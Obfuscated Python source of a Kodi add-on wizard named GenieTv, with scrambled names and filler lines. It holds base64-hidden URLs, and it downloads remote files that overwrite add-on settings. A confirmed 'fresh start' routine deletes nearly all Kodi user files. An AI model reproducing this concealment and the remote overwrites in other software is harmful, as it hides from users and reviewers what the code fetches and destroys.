 OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
 i1iI1iIII = os . path . join ( OO0O00oOo , 'advancedsettings.xml' )
 try :
  oOoooooOoO = open ( i1iI1iIII ) . read ( )
  if 'zero' in oOoooooOoO :
   name = '0CACHE'
  elif 'tuxen' in oOoooooOoO :
   name = 'TUXENS'
  elif 'muckys' in oOoooooOoO :
   name = 'MUCKYS'
  elif 'p2p1' in oOoooooOoO :
   name = '1st P2P RECOMMENDED'
  elif 'p2p2' in oOoooooOoO :
   name = '2nd P2P RECOMMENDED'
  elif 'mikey' in oOoooooOoO :
   name = 'MIKEY1234'
 except :
  name = "NO ADVANCED"
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 i1iiIIiiI111 . ok ( o0oOoO00o , "[COLOR yellow]YOU HAVE[/COLOR] " + name + "[COLOR yellow] XML SETTINGS SETUP[/COLOR]" )
 return
 if 72 - 72: O0
def i1i11II1 ( url ) :
 print '###' + o0oOoO00o + ' - DELETING ADVANCE XML###'
 OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://home/userdata' , '' ) )
 i1iI1iIII = os . path . join ( OO0O00oOo , 'advancedsettings.xml' )
 try :
  os . remove ( i1iI1iIII )
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  print '=== GenieTv - DELETING    ' + str ( i1iI1iIII ) + '    ==='
  i1iiIIiiI111 . ok ( o0oOoO00o , "       Remove Advanced Settings Sucessfull" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "       No Advanced Settings To Remove" )
 return
 if 50 - 50: OoIii111II - OoooooooOO + oo0OO % Ooo00oOo00o
 if 12 - 12: i1IIi / ii11ii1ii - oo0OO . i11iIiiIii / i1IIi / OoooooooOO
 if 88 - 88: ii11i1 / i11iIiiIii % I1IiI % iii11
 if 70 - 70: ii11ii1ii . ii11ii1ii / Ooo0OO0oOO . ii11ii1ii
 if 37 - 37: i1IIi . O0o0Ooo - OoOoOO00 % OOooOOo - i1IIi . OoIii111II
 if 34 - 34: iIii1I11I1II1 / OoOoOO00
 if 3 - 3: OOooOOo - OoooooooOO + oo0OO . Ooo0OO0oOO
 if 88 - 88: Ooo0OO0oOO - oo0OO
 if 68 - 68: Oo % OoIii111II . OoO0O0 - OOooOOo / i1IIi / OoooooooOO
 if 34 - 34: Ooo0OO0oOO % Oo + ii11i1
def o000ooooo ( url = 'http://www.iplocation.net/' , inc = 1 ) :
 o0o = re . compile ( "<td width='80'>(.+?)</td><td>(.+?)</td><td>(.+?)</td><td>.+?</td><td>(.+?)</td>" ) . findall ( i1 . http_GET ( url ) . content )
 for iIOOO , OoOooo , i11iI1111ii1I , OoOo0 in o0o :
  if inc < 2 : i1iiIIiiI111 = xbmcgui . Dialog ( ) ; i1iiIIiiI111 . ok ( 'Check My IP' , "[B][COLOR gold]Your IP Address is: [/COLOR][/B] %s" % iIOOO , '[B][COLOR gold]Your IP is based in: [/COLOR][/B] %s' % i11iI1111ii1I , '[B][COLOR gold]Your Service Provider is:[/COLOR][/B] %s' % OoOo0 )
  inc = inc + 1
  if 22 - 22: i11iIiiIii + I1IiI + OoooooooOO
  if 2 - 2: o0Oo0O0Oo00oO - Ooo0OO0oOO * i1IIi % iii11 / OoooooooOO * iii11
  if 82 - 82: ii11ii1ii . ii11ii1ii * ii11i1 % Ooo0OO0oOO % O0 / Oo
  if 83 - 83: O0o0Ooo + OOooOOo % OoIii111II / Ooo00oOo00o
  if 59 - 59: ii11i1 * iii11 . OoO0O0
  if 68 - 68: O0 * iIii1I11I1II1 / O0o0Ooo
  if 65 - 65: iii11 - OOOo0 * O0o0Ooo
  if 99 - 99: OOOo0
  if 64 - 64: ii11ii1ii * ii11i1 * Oo % OoO0O0 % o0Oo0O0Oo00oO
def OoO0000O ( url , name ) :
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 if i1iiIIiiI111 . yesno ( "GenieTv" , '                                    Install Latest .ini File' ) :
  print '###' + o0oOoO00o + ' - CUSTOM FTV INI###'
  OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://masterprofile/addon_data/plugin.video.GenieTv' , '' ) )
  i1iI1iIII = os . path . join ( OO0O00oOo , 'addons2.ini' )
  oOooo0O0o = i1 . http_GET ( url ) . content
  oOoooooOoO = open ( i1iI1iIII , "w" )
  oOoooooOoO . write ( oOooo0O0o )
  oOoooooOoO . close ( )
  print '=== GenieTv - WRITING NEW    ' + str ( i1iI1iIII ) + '    ==='
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "                               Done Adding New .ini File" )
 return
 if 33 - 33: O0o0Ooo + oo0OO - Oo / ii11i1 + OoIii111II . I1IiI
def Oo0O ( url , name ) :
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 if i1iiIIiiI111 . yesno ( "GenieTv" , '                               Install Custom Settings' ) :
  print '###' + o0oOoO00o + ' - CUSTOM FTV SETTINGS###'
  OO0O00oOo = xbmc . translatePath ( os . path . join ( 'special://masterprofile/addon_data/plugin.video.GenieTv' , '' ) )
  i1iI1iIII = os . path . join ( OO0O00oOo , 'settings.xml' )
  oOooo0O0o = i1 . http_GET ( url ) . content
  oOoooooOoO = open ( i1iI1iIII , "w" )
  oOoooooOoO . write ( oOooo0O0o )
  oOoooooOoO . close ( )
  print '=== GenieTv - WRITING NEW    ' + str ( i1iI1iIII ) + '    ==='
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "                               Done Adding New Settings" )
 return
 if 11 - 11: O0
 if 96 - 96: oo0OO + OOooOOo
def Iiiii1III1iIi ( ) :
 try :
  IIiIiii = xbmc . translatePath ( os . path . join ( 'special://masterprofile/addon_data/plugin.video.GenieTv' , '' ) )
  if os . path . exists ( IIiIiii ) == True :
   i1iiIIiiI111 = xbmcgui . Dialog ( )
   if i1iiIIiiI111 . yesno ( "GenieTv" , "                               Delete FTV Guide Database" ) :
    OOo0OO = os . path . join ( IIiIiii , "source.db" )
    os . unlink ( OOo0OO )
  i1iiIIiiI111 . ok ( "GenieTv" , "                                     FTV Database Reset" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "               Error Deleting Database No Database To Delete" )
 return
 if 98 - 98: i11iIiiIii . O0o0Ooo + I1IiI
 if 55 - 55: Ooo0OO0oOO
 if 72 - 72: Ooo0OO0oOO + o0Oo0O0Oo00oO / OOOo0 . OoO0O0 % Ooo00oOo00o / i11iIiiIii
 if 13 - 13: O0o0Ooo % OOooOOo + iii11 + O0o0Ooo + i11iIiiIii - ii11ii1ii
 if 70 - 70: OoOoOO00 * OoOoOO00 . OOOo0
def ooOOO0 ( url ) :
 O0o = urllib2 . Request ( url )
 O0o . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
 O00oOOooO = urllib2 . urlopen ( O0o )
 oOooo0O0o = O00oOOooO . read ( )
 O00oOOooO . close ( )
 return oOooo0O0o
 if 11 - 11: oo0OO
 if 20 - 20: ii11i1 . O0o0Ooo % ii11i1
 if 5 - 5: iii11 + oo0OO
 if 23 - 23: O0o0Ooo % iIii1I11I1II1 . Ooo0OO0oOO
 if 95 - 95: Oo + i11iIiiIii % iii11 - OoIii111II
 if 11 - 11: ii11ii1ii / O0 + OoOoOO00
 if 95 - 95: O0o0Ooo + OoO0O0 * iIii1I11I1II1
def II1Iii1iI ( params ) :
 plugintools . log ( "freshstart.main_list " + repr ( params ) ) ; oo0iiIIi1i111i = plugintools . message_yes_no ( o0oOoO00o , "Do you wish to restore your" , "Kodi configuration to default settings?" )
 if oo0iiIIi1i111i :
  iII = xbmcaddon . Addon ( id = o00 ) . getAddonInfo ( 'path' ) ; iII = xbmc . translatePath ( iII ) ;
  OoOo0Oo00Oo = os . path . join ( iII , ".." , ".." ) ; OoOo0Oo00Oo = os . path . abspath ( OoOo0Oo00Oo ) ; plugintools . log ( "freshstart.main_list xbmcPath=" + OoOo0Oo00Oo ) ; i11i11I = False
  try :
   for OOOOO , IiiIiI1Ii1i , i1iIiiiiii1II in os . walk ( OoOo0Oo00Oo , topdown = True ) :
    IiiIiI1Ii1i [ : ] = [ I111iIi1 for I111iIi1 in IiiIiI1Ii1i if I111iIi1 not in iiIIIII1i1iI ]
    for OO in i1iIiiiiii1II :
     try : os . remove ( os . path . join ( OOOOO , OO ) )
     except :
      if OO not in [ "Addons15.db" , "MyVideos75.db" , "Textures13.db" , "xbmc.log" ] : i11i11I = True
      plugintools . log ( "Error removing " + OOOOO + " " + OO )
    for OO in IiiIiI1Ii1i :
     try : os . rmdir ( os . path . join ( OOOOO , OO ) )
     except :
      if OO not in [ "Database" , "userdata" ] : i11i11I = True
      plugintools . log ( "Error removing " + OOOOO + " " + OO )
   if not i11i11I : plugintools . log ( "freshstart.main_list All user files removed, you now have a clean install" ) ; plugintools . message ( o0oOoO00o , "The process is complete, you're now back to a fresh Kodi configuration with GenieTv!" , "Please reboot your system or restart Kodi in order for the changes to be applied." )
   else : plugintools . log ( "freshstart.main_list User files partially removed" ) ; plugintools . message ( o0oOoO00o , "The process is complete, you're now back to a fresh Kodi configuration with GenieTv" , "Please reboot your system or restart Kodi in order for the changes to be applied." )
  except : plugintools . message ( o0oOoO00o , "Problem found" , "Your settings has not been changed" ) ; import traceback ; plugintools . log ( traceback . format_exc ( ) ) ; plugintools . log ( "freshstart.main_list NOT removed" )
  plugintools . add_item ( action = "" , title = "Now Exit Kodi" , folder = False )
 else : plugintools . message ( o0oOoO00o , "Your settings" , "has not been changed" ) ; plugintools . add_item ( action = "" , title = "Done" , folder = False )
 OOo00O ( )
 if 61 - 61: iIii1I11I1II1 % ii11i1 - OoIii111II * OoooooooOO % OoOoOO00 - ii11i1
 if 44 - 44: O0
 if 9 - 9: OoIii111II . Oo + oo0OO + OOOo0 * OOOo0 - OOOo0
def O0000O ( ) :
 OoOOOOo = [ ]
 iIi11 = sys . argv [ 2 ]
 if len ( iIi11 ) >= 2 :
  o0OOo = sys . argv [ 2 ]
  I1i1i1IIi1I = o0OOo . replace ( '?' , '' )
  if ( o0OOo [ len ( o0OOo ) - 1 ] == '/' ) :
   o0OOo = o0OOo [ 0 : len ( o0OOo ) - 2 ]
  IIi11iIIiIiI = I1i1i1IIi1I . split ( '&' )
  OoOOOOo = { }
  for Ii in range ( len ( IIi11iIIiIiI ) ) :
   oo000oo00 = { }
   oo000oo00 = IIi11iIIiIiI [ Ii ] . split ( '=' )
   if ( len ( oo000oo00 ) ) == 2 :
    OoOOOOo [ oo000oo00 [ 0 ] ] = oo000oo00 [ 1 ]
    if 46 - 46: OoOoOO00 - OoooooooOO - Ooo00oOo00o . ii11ii1ii * Oo + iIii1I11I1II1
 return OoOOOOo
 if 19 - 19: O0 % OoOoOO00 * OOooOOo
II11I = base64 . decodestring ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20v' )
OoOo000oOo0oo = base64 . decodestring ( 'L3N0b3JhZ2UvZW11bGF0ZWQvMA==' )
OooOOO0O00 = base64 . decodestring ( 'L2dlbmllLnR4dA==' )
I1i1IiIIiIiII = base64 . decodestring ( 'LmFyY2hpdGVjdHMueDEwaG9zdC5jb20vdGVzdC93aC50eHQ=' )
Oo000 = base64 . decodestring ( 'aHR0cDovL2ZpeGVzLmFyY2hpdGVjdHMueDEwaG9zdC5jb20vZml4ZXMudHh0' )
IiIii11iI1i1 = base64 . decodestring ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vYXBwcy9hcHBzLnhtbA==' )
I1o0 = base64 . decodestring ( 'L2FkZG9ucy9uZXcudHh0' )
oo0oOoo = base64 . decodestring ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vdm9kL3ZvZC5waHA=' )
o0o0O00oOo = base64 . decodestring ( 'L2FkZG9ucy9pcHR2LnR4dA==' )
IIIiI1iIIII = base64 . decodestring ( 'L2FkZG9ucy92aWRlby50eHQ=' )
ii1IIi1iI1ii1 = base64 . decodestring ( 'L2FkZG9ucy9zcG9ydHMudHh0' )
II1I1ii = base64 . decodestring ( 'L2FkZG9ucy9raWRzLnR4dA==' )
IiI11II = base64 . decodestring ( 'L2FkZG9ucy9tdXNpYy50eHQ=' )
O0oOo0o0OOoO0 = base64 . decodestring ( 'L2FkZG9ucy9wcm9ncmFtcy50eHQ=' )
IiiIi1IiiiI = base64 . decodestring ( 'L2FkZG9ucy94eHgudHh0' )
ooOo = base64 . decodestring ( 'L2FkZG9ucy9yZXBvLnR4dA==' )
iii1 = base64 . decodestring ( 'L2FkZG9ucy9wYWNrcy50eHQ=' )
iiII = base64 . decodestring ( 'L2FkZG9ucy9za2lucy50eHQ=' )
iiIi = base64 . decodestring ( 'L2FkZG9ucy9hcnQudHh0' )
oO0o0O0Ooo0o = base64 . decodestring ( 'L2FkZG9ucy9Ta2luc2dvdGhhbS50eHQ=' )
oOO0OooOo = base64 . decodestring ( 'L2FkZG9ucy9Ta2luc2hlbGl4LnR4dA==' )
O0Oo00 = base64 . decodestring ( 'L2FkZG9ucy9Ta2luc2lzZW5nYXJkLnR4dA==' )
Iiii11 = base64 . decodestring ( 'L2FkZG9ucy9SU1MudHh0' )
oO0O0oO0 = base64 . decodestring ( 'Q1VOVA==' )
def ooOooo000oOO ( name , url , mode , iconimage , fanart , description , showcontext = True , allinfo = { } ) :
 o00OoO0oO00 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 iIi = True
 iiO0O0o0oO0O00 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 iiO0O0o0oO0O00 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 iiO0O0o0oO0O00 . setProperty ( "Fanart_Image" , fanart )
 if showcontext :
  IiiIi1iI1 = [ ]
  if showcontext == 'fav' :
   IiiIi1iI1 . append ( ( 'Remove from Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10056&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
  if not name in OOO00 :
   IiiIi1iI1 . append ( ( 'Add to Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10055&name=%s&url=%s&iconimage=%s&fanart=%s&fav_mode=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) , urllib . quote_plus ( url ) , urllib . quote_plus ( iconimage ) , urllib . quote_plus ( fanart ) , mode ) ) )
  iiO0O0o0oO0O00 . addContextMenuItems ( IiiIi1iI1 )
 iIi = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o00OoO0oO00 , listitem = iiO0O0o0oO0O00 , isFolder = True )
 return iIi
 if 39 - 39: O0 . Ooo0OO0oOO
def Ii1iIiII1ii1 ( name , url , mode , iconimage , fanart , description ) :
 o00OoO0oO00 = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 iIi = True
 iiO0O0o0oO0O00 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 iiO0O0o0oO0O00 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 iiO0O0o0oO0O00 . setProperty ( "Fanart_Image" , fanart )
 iIi = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = o00OoO0oO00 , listitem = iiO0O0o0oO0O00 , isFolder = False )
 return iIi
 if 45 - 45: OoIii111II + OOooOOo + OoO0O0 / ii11i1 + OOooOOo
 if 33 - 33: oo0OO - Oo - Ooo0OO0oOO
o0OOo = O0000O ( )
iI1i11 = None
OO = None
Ii1ii11IIIi = None
IIii1111 = None
I1iI = None
iI1i111I1Ii = None
O0ooOo = None
if 30 - 30: I1IiI - i11iIiiIii
if 94 - 94: I1IiI % oo0OO
try :
 O0ooOo = int ( o0OOo [ "fav_mode" ] )
except :
 pass
 if 39 - 39: I1IiI + O0o0Ooo % O0
try :
 iI1i11 = urllib . unquote_plus ( o0OOo [ "url" ] )
except :
 pass
try :
 OO = urllib . unquote_plus ( o0OOo [ "name" ] )
except :
 pass
try :
 IIii1111 = urllib . unquote_plus ( o0OOo [ "iconimage" ] )
except :
 pass
try :
 Ii1ii11IIIi = int ( o0OOo [ "mode" ] )
except :
 pass
try :
 I1iI = urllib . unquote_plus ( o0OOo [ "fanart" ] )
except :
 pass
try :
 iI1i111I1Ii = urllib . unquote_plus ( o0OOo [ "description" ] )
except :
 pass
 if 26 - 26: o0Oo0O0Oo00oO + I1IiI
 if 17 - 17: ii11ii1ii - oo0OO % Oo * O0 % O0 * iii11
print str ( O0OoO000O0OO ) + ': ' + str ( O00ooOO )
print "Mode: " + str ( Ii1ii11IIIi )
print "URL: " + str ( iI1i11 )
print "Name: " + str ( OO )
print "IconImage: " + str ( IIii1111 )
if 6 - 6: O0o0Ooo
if 46 - 46: OoOoOO00 * O0o0Ooo
def Oo0OoO00oOO0o ( content , viewType ) :
 if 23 - 23: i1IIi - O0
 if content :
  xbmcplugin . setContent ( int ( sys . argv [ 1 ] ) , content )
 if o0oO0 . getSetting ( 'auto-view' ) == 'true' :
  xbmc . executebuiltin ( "Container.SetViewMode(%s)" % o0oO0 . getSetting ( viewType ) )
  if 6 - 6: o0Oo0O0Oo00oO % OoooooooOO * O0o0Ooo - OoO0O0
  if 24 - 24: Ooo0OO0oOO / iIii1I11I1II1 . OoooooooOO % I1IiI . ii11i1
if Ii1ii11IIIi == None :
 o00OO00OoO ( )
 if 73 - 73: O0o0Ooo
elif Ii1ii11IIIi == 1 :
 o0OoO00o0000O ( iI1i11 )
 if 25 - 25: OoO0O0
elif Ii1ii11IIIi == 44 :
 I11Ii11iI1 ( iI1i11 )
 if 77 - 77: OOooOOo . iIii1I11I1II1 . OoooooooOO . iIii1I11I1II1
elif Ii1ii11IIIi == 2 :
 ooO0oO00O0o ( )
 if 87 - 87: OoOoOO00 - OoooooooOO / i1IIi . ii11i1 - Oo . i11iIiiIii
elif Ii1ii11IIIi == 3 :
 O00oO ( )
 if 47 - 47: Oo % Ooo00oOo00o - o0Oo0O0Oo00oO - Oo * OoIii111II
elif Ii1ii11IIIi == 21 :
 iI1Ii11111iIi ( )
 if 72 - 72: OOooOOo % OOooOOo + oo0OO + ii11ii1ii / Oo
elif Ii1ii11IIIi == 4 :
 i1i1i1I ( )
 if 30 - 30: Oo + OOOo0 + i11iIiiIii / Ooo00oOo00o
elif Ii1ii11IIIi == 5 :
 O0o0O0OO00o ( OO , iI1i11 , iI1i111I1Ii )
 if 64 - 64: OoO0O0
elif Ii1ii11IIIi == 6 :
 i1I111II11 ( iI1i11 )
 if 80 - 80: OOOo0 - i11iIiiIii / Ooo00oOo00o / I1IiI + I1IiI
elif Ii1ii11IIIi == 7 :
 ii1IIOOo00o0o0O0oo ( iI1i11 , OO )
 if 89 - 89: O0 + OoO0O0 * O0o0Ooo
elif Ii1ii11IIIi == 8 :
 oOO0o ( iI1i11 , OO )
 if 30 - 30: I1IiI
elif Ii1ii11IIIi == 9 :
 FIXREPOSADDONS ( iI1i11 )
 if 39 - 39: ii11ii1ii + OOooOOo + O0o0Ooo + OoO0O0
elif Ii1ii11IIIi == 10 :
 iI111i ( )
 if 48 - 48: O0o0Ooo / o0Oo0O0Oo00oO . iIii1I11I1II1
elif Ii1ii11IIIi == 11 :
 i1i11II1 ( iI1i11 )
 if 72 - 72: i1IIi . OOooOOo
elif Ii1ii11IIIi == 12 :
 o000ooooo ( )
 if 3 - 3: I1IiI % OoOoOO00 - O0
elif Ii1ii11IIIi == 13 :
 iIIiII1i1ii ( )
 if 52 - 52: Ooo00oOo00o
elif Ii1ii11IIIi == 14 :
 iiiI ( iI1i11 )
 if 49 - 49: ii11i1 . ii11ii1ii % o0Oo0O0Oo00oO . Oo * iii11
elif Ii1ii11IIIi == 15 :
 OO00 ( )
 if 44 - 44: iIii1I11I1II1 / O0 * Oo + OOOo0 . o0Oo0O0Oo00oO
elif Ii1ii11IIIi == 16 :
 OoO0000O ( iI1i11 , OO )
 if 20 - 20: oo0OO + OOooOOo . O0o0Ooo / i11iIiiIii
elif Ii1ii11IIIi == 17 :
 Oo0O ( iI1i11 , OO )
 if 7 - 7: I1IiI / I1IiI . O0o0Ooo * O0 + OoO0O0 + OoIii111II
elif Ii1ii11IIIi == 18 :
 Iiiii1III1iIi ( )
 if 98 - 98: OoOoOO00 * OoO0O0 - OOOo0 % OOooOOo - oo0OO % ii11ii1ii
elif Ii1ii11IIIi == 19 :
 o0oOoO0O ( OO , iI1i11 , iI1i111I1Ii )
 if 69 - 69: i1IIi % Ooo00oOo00o % O0o0Ooo / o0Oo0O0Oo00oO / o0Oo0O0Oo00oO
elif Ii1ii11IIIi == 40 :
 Iiii11iIi1 ( OO , iI1i11 , iI1i111I1Ii )
 if 6 - 6: OoOoOO00 % ii11ii1ii % i1IIi * o0Oo0O0Oo00oO
elif Ii1ii11IIIi == 42 :
 oOoOoo0 ( OO , iI1i11 , iI1i111I1Ii )
 if 47 - 47: O0
elif Ii1ii11IIIi == 43 :
 Iii111Ii ( OO , iI1i11 , iI1i111I1Ii )
 if 55 - 55: Ooo00oOo00o % O0 / OoooooooOO
elif Ii1ii11IIIi == 20 :
 oOO ( iI1i11 )
 if 49 - 49: OOOo0 . Ooo00oOo00o * OoooooooOO % i11iIiiIii + iIii1I11I1II1 * i1IIi
elif Ii1ii11IIIi == 22 :
 OOoOo0O0 ( iI1i11 )
 if 88 - 88: ii11ii1ii * oo0OO + OoOoOO00
elif Ii1ii11IIIi == 23 :
 O0OO ( iI1i11 )
 if 62 - 62: OoooooooOO
elif Ii1ii11IIIi == 24 :
 Ooooo ( iI1i11 )
 if 33 - 33: O0 . i11iIiiIii % OOooOOo
elif Ii1ii11IIIi == 25 :
 IIIIi1Iii1iIi ( iI1i11 )
 if 50 - 50: o0Oo0O0Oo00oO
elif Ii1ii11IIIi == 26 :
 iIIiIi111iI ( iI1i11 )
 if 81 - 81: i11iIiiIii * iIii1I11I1II1 / Oo * iii11
elif Ii1ii11IIIi == 27 :
 oOoO0O00o ( iI1i11 )
 if 83 - 83: i11iIiiIii - OOOo0 * i11iIiiIii
elif Ii1ii11IIIi == 28 :
 I11IiIi1iI1ii ( iI1i11 )
 if 59 - 59: oo0OO - OoooooooOO / o0Oo0O0Oo00oO + ii11ii1ii . OOooOOo - oo0OO
elif Ii1ii11IIIi == 29 :
 oooOoO ( iI1i11 )
 if 29 - 29: OoIii111II
elif Ii1ii11IIIi == 30 :
 o0OooO0ooo0o ( iI1i11 )
 if 26 - 26: O0 % iii11 - OoO0O0 . iii11
elif Ii1ii11IIIi == 31 :
 oOOo00ooO ( iI1i11 )
 if 70 - 70: OOooOOo + Ooo0OO0oOO / oo0OO + o0Oo0O0Oo00oO / OOOo0
elif Ii1ii11IIIi == 32 :
 i1i1IIii1i1 ( )
 if 33 - 33: OoooooooOO . O0
elif Ii1ii11IIIi == 33 :
 iIi1iI111I ( )
 if 59 - 59: iIii1I11I1II1
elif Ii1ii11IIIi == 35 :
 o0OO0O0Oo ( iI1i11 )
 if 45 - 45: O0
elif Ii1ii11IIIi == 34 :
 IiIi1i1ii ( iI1i11 )
 if 78 - 78: Ooo0OO0oOO - iIii1I11I1II1 + O0o0Ooo - ii11ii1ii - O0o0Ooo
elif Ii1ii11IIIi == 36 :
 I1iii ( iI1i11 )
 if 21 - 21: OoooooooOO . O0 / i11iIiiIii
elif Ii1ii11IIIi == 37 :
 ooOoo0o0O ( iI1i11 )
 if 86 - 86: I1IiI / iii11
elif Ii1ii11IIIi == 38 :
 Ii1II ( iI1i11 )
 if 40 - 40: iIii1I11I1II1 / o0Oo0O0Oo00oO / OOOo0 + ii11ii1ii * iii11
elif Ii1ii11IIIi == 41 :
 II1Iii1iI ( o0OOo )
 if 1 - 1: Ooo00oOo00o * o0Oo0O0Oo00oO + OoO0O0 . OoIii111II / o0Oo0O0Oo00oO
elif Ii1ii11IIIi == 39 :
 oOo0 ( iI1i11 )
 if 91 - 91: ii11i1 + Ooo0OO0oOO - Oo % I1IiI . oo0OO
elif Ii1ii11IIIi == 45 :
 TEXTS ( )
 if 51 - 51: iii11 / Ooo0OO0oOO
elif Ii1ii11IIIi == 46 :
 oooIi1i ( )
 if 51 - 51: o0Oo0O0Oo00oO * OoIii111II - O0o0Ooo + oo0OO
elif Ii1ii11IIIi == 47 :
 GEVID ( )
 if 46 - 46: OOooOOo - i11iIiiIii % Ooo00oOo00o / ii11i1 - I1IiI
elif Ii1ii11IIIi == 48 :
 O0O0o0o0o ( OO , iI1i11 , iI1i111I1Ii )
 if 88 - 88: OoIii111II * OOOo0 / Ooo00oOo00o - iii11 / i1IIi . O0o0Ooo
elif Ii1ii11IIIi == 49 :
 I111IiiIi1 ( )
 if 26 - 26: i11iIiiIii - o0Oo0O0Oo00oO
elif Ii1ii11IIIi == 222 :
 oOo0OOoO0 ( iI1i11 )
 if 45 - 45: o0Oo0O0Oo00oO + OoOoOO00 % oo0OO
elif Ii1ii11IIIi == 333 :
 iiI1i11I ( iI1i11 )
 if 55 - 55: o0Oo0O0Oo00oO - OoIii111II % OOOo0
 if 61 - 61: o0Oo0O0Oo00oO
elif Ii1ii11IIIi == 1020 :
 iiii1Ii1iii ( )
 if 22 - 22: iIii1I11I1II1 / o0Oo0O0Oo00oO / OOOo0 - OOooOOo
elif Ii1ii11IIIi == 1021 :
 ANIMEEP ( )
 if 21 - 21: OoIii111II . i11iIiiIii * Ooo0OO0oOO . iii11 / iii11
elif Ii1ii11IIIi == 1022 :
 ANIMEPLAY ( iI1i11 )
 if 42 - 42: OoooooooOO / O0o0Ooo . OOooOOo / O0 - OoO0O0 * OoO0O0
elif Ii1ii11IIIi == 1001 :
 iIii1II1I ( )
 if 1 - 1: ii11i1 % O0o0Ooo
elif Ii1ii11IIIi == 1005 :
 o0oooo0oo00O ( )
 if 97 - 97: I1IiI
elif Ii1ii11IIIi == 1007 :
 IIIIII1iI1II ( iI1i11 )
 if 13 - 13: I1IiI % iii11 . O0 / Oo % Oo
elif Ii1ii11IIIi == 1010 :
 ooo000o ( iI1i11 )
 if 19 - 19: O0o0Ooo % o0Oo0O0Oo00oO - o0Oo0O0Oo00oO % OOOo0 . iii11 - OoooooooOO
elif Ii1ii11IIIi == 1011 :
 OOOOOO ( iI1i11 )
 if 100 - 100: OOOo0 + ii11i1 + OOooOOo . i1IIi % OoooooooOO
elif Ii1ii11IIIi == 1030 :
 oOO0O ( )
 if 64 - 64: O0 % i1IIi * O0o0Ooo - ii11i1 + Oo
elif Ii1ii11IIIi == 1031 :
 oooo0 ( iI1i11 , IIii1111 )
 if 65 - 65: I1IiI . i11iIiiIii
elif Ii1ii11IIIi == 1006 :
 Parse . ParseURL ( iI1i11 )
 if 36 - 36: OoIii111II * oo0OO + OoO0O0 * oo0OO . ii11ii1ii - iIii1I11I1II1
elif Ii1ii11IIIi == 2030 :
 Parse . addonParseURL ( iI1i11 )
 if 14 - 14: Ooo0OO0oOO * OoIii111II + i11iIiiIii
elif Ii1ii11IIIi == 2031 :
 Parse . apkParseURL ( iI1i11 )
 if 84 - 84: oo0OO / OoOoOO00
elif Ii1ii11IIIi == 1002 :
 iIiiII1Ii1ii ( iI1i11 )
 if 86 - 86: OOOo0
elif Ii1ii11IIIi == 1003 :
 iIIi1 ( iI1i11 , IIii1111 )
 if 97 - 97: OoOoOO00
elif Ii1ii11IIIi == 1004 :
 OoOo0O00 ( iI1i11 )
 if 38 - 38: OOOo0
elif Ii1ii11IIIi == 1008 :
 oOoo0OO0 ( )
 if 42 - 42: OOooOOo
elif Ii1ii11IIIi == 1009 :
 M3UPLAY ( iI1i11 )
 if 8 - 8: i11iIiiIii / o0Oo0O0Oo00oO
elif Ii1ii11IIIi == 2001 :
 I1i11IIIi ( iI1i11 )
 if 33 - 33: O0o0Ooo * OoO0O0 - O0 + OOOo0 / OoO0O0
elif Ii1ii11IIIi == 1013 :
 iIIIi1i1I11i ( )
 if 19 - 19: i1IIi % OoOoOO00
elif Ii1ii11IIIi == 1014 :
 iIiII11 ( )
 if 85 - 85: OoO0O0 - OOooOOo % iii11 - OoOoOO00
elif Ii1ii11IIIi == 1015 :
 II11IiiiiI1i ( iI1i11 )
 if 56 - 56: ii11i1 * i11iIiiIii
elif Ii1ii11IIIi == 1016 :
 Iii1IIII1Iii ( iI1i11 )
 if 92 - 92: OoOoOO00 - O0 . O0o0Ooo
elif Ii1ii11IIIi == 1023 :
 I11o0oO00oO0o0o0 ( )
 if 59 - 59: I1IiI
elif Ii1ii11IIIi == 1024 :
 IIi ( )
 if 47 - 47: OoOoOO00 - ii11ii1ii - ii11i1
elif Ii1ii11IIIi == 1025 :
 i1Ii1i1ii1 ( iI1i11 )
 if 9 - 9: ii11ii1ii - OoO0O0
elif Ii1ii11IIIi == 4001 :
 OoOO0oo0o ( )
 if 64 - 64: i1IIi
elif Ii1ii11IIIi == 4002 :
 II11i1I11Ii1i ( )
 if 71 - 71: OoO0O0 * OOooOOo
elif Ii1ii11IIIi == 4003 :
 i1iII1II11I ( )
